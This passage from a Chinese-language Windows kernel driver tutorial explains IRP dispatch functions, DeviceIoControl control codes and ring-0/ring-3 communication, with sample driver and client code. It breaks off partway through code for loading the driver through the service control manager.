<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_CREATE                   0x00</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_CREATE_NAMED_PIPE        0x01</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_CLOSE                    0x02</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_READ                     0x03</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_WRITE                    0x04</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_QUERY_INFORMATION        0x05</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_SET_INFORMATION          0x06</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_QUERY_EA                 0x07</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_SET_EA                   0x08</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_FLUSH_BUFFERS            0x09</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_QUERY_VOLUME_INFORMATION 0x0a</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_SET_VOLUME_INFORMATION   0x0b</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_DIRECTORY_CONTROL        0x0c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_FILE_SYSTEM_CONTROL      0x0d</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_DEVICE_CONTROL           0x0e</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_INTERNAL_DEVICE_CONTROL  0x0f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_SHUTDOWN                 0x10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_LOCK_CONTROL             0x11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_CLEANUP                  0x12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_CREATE_MAILSLOT          0x13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_QUERY_SECURITY           0x14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_SET_SECURITY             0x15</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_POWER                    0x16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_SYSTEM_CONTROL           0x17</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_DEVICE_CHANGE            0x18</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_QUERY_QUOTA              0x19</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_SET_QUOTA                0x1a</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_PNP                      0x1b</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_PNP_POWER                IRP_MJ_PNP      <span class="comment">// Obsolete....</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_MAXIMUM_FUNCTION         0x1b</span></span><br></pre></td></tr></table></figure>



<p><strong>派遣函数：</strong></p>
<div class="note success"><p>在Win32中，回调函数需要在窗口处理函数的参数中进行指定。在驱动程序中，<strong>回调函数需要在驱动对象里面进行指定</strong>（派遣）。</p>
<p>一个驱动可以创建许多设备，这些设备的回调函数都放在<strong>驱动对象</strong>的最后一个成员里面（<code>MajorFunction</code>）。<strong>函数是有顺序的</strong>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">PDRIVER_DISPATCH MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + <span class="number">1</span>];</span><br></pre></td></tr></table></figure>

<p>IRP_MJ_MAXIMUM_FUNCTION ：派遣函数的最大值</p>
</div>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _DRIVER_OBJECT</span><br><span class="line">ntdll!_DRIVER_OBJECT</span><br><span class="line">   +<span class="number">0x000</span> Type             : Int2B	<span class="comment">//2B = 2Byte(SHORT)</span></span><br><span class="line">   +<span class="number">0x002</span> Size             : Int2B</span><br><span class="line">   +<span class="number">0x004</span> DeviceObject     : Ptr32 _DEVICE_OBJECT</span><br><span class="line">   +<span class="number">0x008</span> Flags            : Uint4B</span><br><span class="line">   +<span class="number">0x00c</span> DriverStart      : Ptr32 Void	<span class="comment">//Ptr32：32位的指针类型</span></span><br><span class="line">   +<span class="number">0x010</span> DriverSize       : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> DriverSection    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x018</span> DriverExtension  : Ptr32 _DRIVER_EXTENSION</span><br><span class="line">   +<span class="number">0x01c</span> DriverName       : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x024</span> HardwareDatabase : Ptr32 _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x028</span> FastIoDispatch   : Ptr32 _FAST_IO_DISPATCH</span><br><span class="line">   +<span class="number">0x02c</span> DriverInit       : Ptr32     <span class="keyword">long</span> </span><br><span class="line">   +<span class="number">0x030</span> DriverStartIo    : Ptr32     <span class="keyword">void</span> </span><br><span class="line">   +<span class="number">0x034</span> DriverUnload     : Ptr32     <span class="keyword">void</span> </span><br><span class="line">   +<span class="number">0x038</span> MajorFunction    : [<span class="number">28</span>] Ptr32     <span class="keyword">long</span> </span><br></pre></td></tr></table></figure>

<p><strong>注册派遣函数：</strong>（需要谁就注册谁），<strong>函数是有顺序的</strong>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING reg_path)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//设置派遣函数</span></span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_CREATE]	= 派遣函数<span class="number">1</span>;  </span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_CLOSE]	= 派遣函数<span class="number">2</span>;  </span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_WRITE]	= 派遣函数<span class="number">3</span>;  </span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_READ]	= 派遣函数<span class="number">4</span>;  </span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_CLEANUP]= 派遣函数<span class="number">5</span>;  </span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_SET_INFORMATION] 	= 派遣函数<span class="number">6</span>;  </span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] 	= 派遣函数<span class="number">7</span>;  </span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_SHUTDOWN] 		= 派遣函数<span class="number">8</span>;  </span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_SYSTEM_CONTROL] 	= 派遣函数<span class="number">9</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><strong>派遣函数的格式</strong></p>
<p>Win32的窗口回调函数有自己的格式，同样的派遣函数也有自己的格式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">MyDispatchFunction</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//处理自己的业务...</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置返回状态</span></span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;	<span class="comment">//  getlasterror()得到的就是这个值</span></span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>;		<span class="comment">//  返回给3环多少数据 没有填0</span></span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);<span class="comment">//将消息向下处理</span></span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h3 id="1-6-IRP-MJ-DEVICE-CONTROL交互数据"><a href="#1-6-IRP-MJ-DEVICE-CONTROL交互数据" class="headerlink" title="1.6 IRP_MJ_DEVICE_CONTROL交互数据"></a>1.6 IRP_MJ_DEVICE_CONTROL交互数据</h3><p>应用层调用DeviceControl函数会产生此IRP。<strong>该函数可以与设备双向交互数据</strong>，最常用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">DeviceIoControl</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]                HANDLE       hDevice,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]                DWORD        dwIoControlCode,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in, optional]      LPVOID       lpInBuffer,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]                DWORD        nInBufferSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  [out, optional]     LPVOID       lpOutBuffer,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]                DWORD        nOutBufferSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  [out, optional]     LPDWORD      lpBytesReturned,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in, out, optional] LPOVERLAPPED lpOverlapped</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>需要注意的是参数2，控制码：<code>dwIoControlCode</code>。32位整数，由一个宏<code>CTL_CODE</code>将4个参数组成一个32位数字。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPER1 CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br></pre></td></tr></table></figure>

<ul>
<li>FILE_DEVICE_UNKNOWN：设备类型</li>
<li>0x800：自定义代码，0～0x7FF为保留，用户可用0x800～0xFFF</li>
<li>METHOD_BUFFERED：交互方式</li>
<li>FILE_ANY_ACCESS：权限</li>
</ul>
<h3 id="1-7-练习：0环与3环通信"><a href="#1-7-练习：0环与3环通信" class="headerlink" title="1.7 练习：0环与3环通信"></a>1.7 练习：0环与3环通信</h3><p>0环代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="comment">//#include &lt;ntifs.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_NAME <span class="meta-string">L&quot;\\Device\\A1v1n_Device_R0&quot;</span>	<span class="comment">//设备名称，0环用</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYMBOLICLINK_NAME <span class="meta-string">L&quot;\\??\\A1v1n_Device_R3&quot;</span>	<span class="comment">//符号链接的名称，3环用</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCreateProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span>;<span class="comment">//派遣函数--CreateFile</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCloseProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span>;<span class="comment">//派遣函数--CloseHandle</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpDeviceIoControlProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span>;<span class="comment">//派遣函数--DeviceIoControl</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPER1 CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPER2 CTL_CODE(FILE_DEVICE_UNKNOWN,0x900,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载函数</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	UNICODE_STRING SymbolicLinkName;</span><br><span class="line">	<span class="comment">//删除符号连接</span></span><br><span class="line">	RtlInitUnicodeString(&amp;SymbolicLinkName,SYMBOLICLINK_NAME);</span><br><span class="line">	IoDeleteSymbolicLink(&amp;SymbolicLinkName);</span><br><span class="line">	<span class="comment">//删除设备</span></span><br><span class="line">	IoDeleteDevice(pDriver-&gt;DeviceObject);</span><br><span class="line">	DbgPrint(<span class="string">&quot;驱动程序停止运行了.\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数，相当于main</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">( IN PDRIVER_OBJECT pDriver, IN PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	NTSTATUS Ntstaus = <span class="number">0</span>;</span><br><span class="line">	PDEVICE_OBJECT pDeviceObj = <span class="literal">NULL</span>;	<span class="comment">//设备对象</span></span><br><span class="line">	UNICODE_STRING Unicode_Devicename = &#123;<span class="number">0</span>&#125;;<span class="comment">//设备名称</span></span><br><span class="line">	UNICODE_STRING SymbolicLinkName = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建设备名称</span></span><br><span class="line">	RtlInitUnicodeString(&amp;Unicode_Devicename,DEVICE_NAME);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建设备对象</span></span><br><span class="line">	Ntstaus = IoCreateDevice(pDriver, <span class="number">0</span> , &amp;Unicode_Devicename, FILE_DEVICE_UNKNOWN, \</span><br><span class="line">                           FILE_DEVICE_SECURE_OPEN, FALSE, &amp;pDeviceObj);</span><br><span class="line">	<span class="keyword">if</span>(Ntstaus != STATUS_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		DbgPrint(<span class="string">&quot;创建设备对象失败了.\r\n&quot;</span>);	</span><br><span class="line">		IoDeleteDevice(pDeviceObj);</span><br><span class="line">		<span class="keyword">return</span> Ntstaus;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置数据交互方式</span></span><br><span class="line">	pDeviceObj-&gt;Flags |= DO_BUFFERED_IO;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建符号链接</span></span><br><span class="line">	RtlInitUnicodeString(&amp;SymbolicLinkName,SYMBOLICLINK_NAME);</span><br><span class="line">	IoCreateSymbolicLink(&amp;SymbolicLinkName,&amp;Unicode_Devicename);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//注册派遣函数</span></span><br><span class="line">	pDriver-&gt;MajorFunction[IRP_MJ_CREATE] = IrpCreateProc;</span><br><span class="line">	pDriver-&gt;MajorFunction[IRP_MJ_CLOSE] = IrpCloseProc;</span><br><span class="line">	pDriver-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpDeviceIoControlProc;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置一个卸载函数，便于退出</span></span><br><span class="line">	pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCreateProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//处理自己的业务...</span></span><br><span class="line">	DbgPrint(<span class="string">&quot;应用层连接设备成功.\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置返回状态</span></span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;	<span class="comment">//  getlasterror()得到的就是这个值</span></span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>;		<span class="comment">//  返回给3环多少数据 没有填0</span></span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);<span class="comment">//将消息向下处理</span></span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCloseProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//处理自己的业务...</span></span><br><span class="line">	DbgPrint(<span class="string">&quot;应用层设备断开连接.\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置返回状态</span></span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;	<span class="comment">//  getlasterror()得到的就是这个值</span></span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>;		<span class="comment">//  返回给3环多少数据 没有填0</span></span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);<span class="comment">//将消息向下处理</span></span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpDeviceIoControlProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	NTSTATUS status = <span class="number">0</span>;</span><br><span class="line">	PIO_STACK_LOCATION pIrpStack = <span class="literal">NULL</span>;	<span class="comment">//用于接收缓冲区的数据</span></span><br><span class="line">	ULONG uIoControlCode = <span class="number">0</span>;		<span class="comment">//控制码</span></span><br><span class="line">	PVOID pIoBuffer = <span class="literal">NULL</span>;		<span class="comment">//缓冲区地址</span></span><br><span class="line">	ULONG uInLength = <span class="number">0</span>;		<span class="comment">//从R3发送过来的数据长度</span></span><br><span class="line">	ULONG uOutLength = <span class="number">0</span>;		<span class="comment">//从R0发给R3的数据长度</span></span><br><span class="line">	ULONG uRead = <span class="number">0</span>;		<span class="comment">//从缓冲区读取的值</span></span><br><span class="line">	ULONG uWrite = <span class="number">0x12345678</span>;	<span class="comment">//写入缓冲区的值</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 从缓冲区获取数据</span></span><br><span class="line">	pIrpStack = IoGetCurrentIrpStackLocation(pIrp);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取控制码</span></span><br><span class="line">	uIoControlCode = pIrpStack-&gt;Parameters.DeviceIoControl.IoControlCode;</span><br><span class="line">	<span class="comment">// 获取缓冲区地址（输入输出是同一个）</span></span><br><span class="line">	pIoBuffer = pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">	<span class="comment">// Ring3 发送数据的长度</span></span><br><span class="line">	uInLength = pIrpStack-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line">	<span class="comment">// Ring0 发送数据的长度</span></span><br><span class="line">	uOutLength = pIrpStack-&gt;Parameters.DeviceIoControl.OutputBufferLength;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span>(uIoControlCode)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">case</span> OPER1:</span><br><span class="line">		&#123;</span><br><span class="line">			DbgPrint(<span class="string">&quot;IrpDeviceControlProc -&gt; OPER1...\n&quot;</span>);</span><br><span class="line">			pIrp-&gt;IoStatus.Information = <span class="number">0</span>;	<span class="comment">// 返回给3环多少数据，没有填0</span></span><br><span class="line">			status = STATUS_SUCCESS;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> OPER2:</span><br><span class="line">		&#123;</span><br><span class="line">			DbgPrint(<span class="string">&quot;IrpDeviceControlProc -&gt; OPER2 接收字节数: %d\n&quot;</span>, uInLength);</span><br><span class="line">			DbgPrint(<span class="string">&quot;IrpDeviceControlProc -&gt; OPER2 输出字节数: %d\n&quot;</span>, uOutLength);</span><br><span class="line">			<span class="comment">// 读取缓冲区</span></span><br><span class="line">			<span class="built_in">memcpy</span>(&amp;uRead,pIoBuffer,<span class="number">4</span>);</span><br><span class="line">			DbgPrint(<span class="string">&quot;IrpDeviceControlProc -&gt; OPER2 uRead: %x\n&quot;</span>, uRead);</span><br><span class="line">			<span class="comment">// 写入缓冲区</span></span><br><span class="line">			<span class="built_in">memcpy</span>(pIoBuffer, &amp;uWrite, <span class="number">4</span>);</span><br><span class="line">			<span class="comment">// 设置状态</span></span><br><span class="line">			pIrp-&gt;IoStatus.Information = <span class="number">2</span>; <span class="comment">// 返回给3环2字节</span></span><br><span class="line">			status = STATUS_SUCCESS;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置返回状态</span></span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;	<span class="comment">//  getlasterror()得到的就是这个值</span></span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);<span class="comment">//将消息向下处理</span></span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>3环代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYMBOLICLINK_NAME <span class="meta-string">L&quot;\\\\.\\A1v1n_Device_R3&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPER1 CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPER2 CTL_CODE(FILE_DEVICE_UNKNOWN,0x900,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IN_BUFFER_MAXLENGTH 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OUT_BUFFER_MAXLENGTH 4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="comment">// 获取设备句柄</span></span><br><span class="line">	HANDLE hDevice = CreateFileW(SYMBOLICLINK_NAME,GENERIC_READ|GENERIC_WRITE,<span class="number">0</span>,<span class="number">0</span>,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,<span class="number">0</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	DWORD dwError = GetLastError();</span><br><span class="line">	<span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;		</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;获取设备句柄失败 %d.\n&quot;</span>, dwError); <span class="comment">// 如果返回1，请在驱动中指定 IRP_MJ_CREATE 处理函数</span></span><br><span class="line">		getchar();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;获取设备句柄成功.\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 测试通信</span></span><br><span class="line">	DWORD dwInBuffer = <span class="number">0x11111111</span>;</span><br><span class="line">	DWORD dwOutBuffer = <span class="number">0</span>;</span><br><span class="line">	DWORD dwOut;	</span><br><span class="line">	DeviceIoControl(hDevice,OPER2,&amp;dwInBuffer,IN_BUFFER_MAXLENGTH,&amp;dwOutBuffer,OUT_BUFFER_MAXLENGTH,&amp;dwOut,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;dwOutBuffer: %08X dwOut: %08X\n&quot;</span>, dwOutBuffer, dwOut);</span><br><span class="line">	<span class="comment">// 关闭设备</span></span><br><span class="line">	CloseHandle(hDevice);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/01/18/6T3ZsKWSqDyvcnX.png" alt="23.png"></p>
<p><img data-src="https://s2.loli.net/2022/01/18/c9WSOqd3kJMptmh.png" alt="24.png"></p>
<h3 id="1-8-练习：在3环实现驱动加载运行"><a href="#1-8-练习：在3环实现驱动加载运行" class="headerlink" title="1.8 练习：在3环实现驱动加载运行"></a>1.8 练习：在3环实现驱动加载运行</h3><p><strong>一、手动加载驱动步骤</strong></p>
<p>用GetFullPathNameW获取驱动的完整路径<br>用OpenSCManager打开服务控制管理器<br>用CreateServiceW创建服务<br>如果服务创建已存在,直接用OpenServiceW打开服务,否则用StartServiceW开启服务<br><strong>二、卸载</strong></p>
<p>用OpenSCManager打开服务控制管理器<br>用OpenServiceA打开服务<br>用ControlService停止驱动服务</p>
<p><strong>⚠️注意：</strong>驱动项目名应和三环中定义的 DRIVER_NAME 一致。<code>MathsDriver.sys</code>程序需要放到3环程序所在目录。</p>
<p>3环代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 编写一个简单的驱动，在驱动入口和卸载函数打印一些提示信息</span></span><br><span class="line"><span class="comment">// 这个驱动可以做加法，3环程序可以给他传两个4字节整数，驱动会返回相加的结果</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRIVER_NAME <span class="meta-string">L&quot;MathsDriver&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRIVER_PATH <span class="meta-string">L&quot;MathsDriver.sys&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRIVER_LINK <span class="meta-string">L&quot;\\\\.\\MathsDriverLnk&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPERADD CTL_CODE(FILE_DEVICE_UNKNOWN,0x900,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">LoadDriver</span><span class="params">(PCWSTR lpszDriverName, PCWSTR lpszDriverPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 获取驱动完整路径</span></span><br><span class="line">	WCHAR szDriverFullPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	GetFullPathNameW(lpszDriverPath,MAX_PATH,szDriverFullPath,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">//printf(&quot;%ws\n&quot;, szDriverFullPath);</span></span><br><span class="line">	<span class="comment">// 打开服务控制管理器</span></span><br><span class="line">	SC_HANDLE hServiceMgr = <span class="literal">NULL</span>; <span class="comment">// SCM管理器句柄	</span></span><br><span class="line">	hServiceMgr = OpenSCManagerW(<span class="literal">NULL</span>,<span class="literal">NULL</span>,SC_MANAGER_ALL_ACCESS);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == hServiceMgr)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;OpenSCManagerW 失败, %d\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;打开服务控制管理器成功.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 创建驱动服务</span></span><br><span class="line">	SC_HANDLE hServiceDDK = <span class="literal">NULL</span>; <span class="comment">// NT驱动程序服务句柄</span></span><br><span class="line">	hServiceDDK = CreateServiceW(</span><br><span class="line">		hServiceMgr,</span><br><span class="line">		lpszDriverName,</span><br><span class="line">		lpszDriverName,</span><br><span class="line">		SERVICE_ALL_ACCESS,</span><br><span class="line">		SERVICE_KERNEL_DRIVER,</span><br><span class="line">		SERVICE_DEMAND_START,</span><br><span class="line">		SERVICE_ERROR_IGNORE,</span><br><span class="line">		szDriverFullPath,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line">	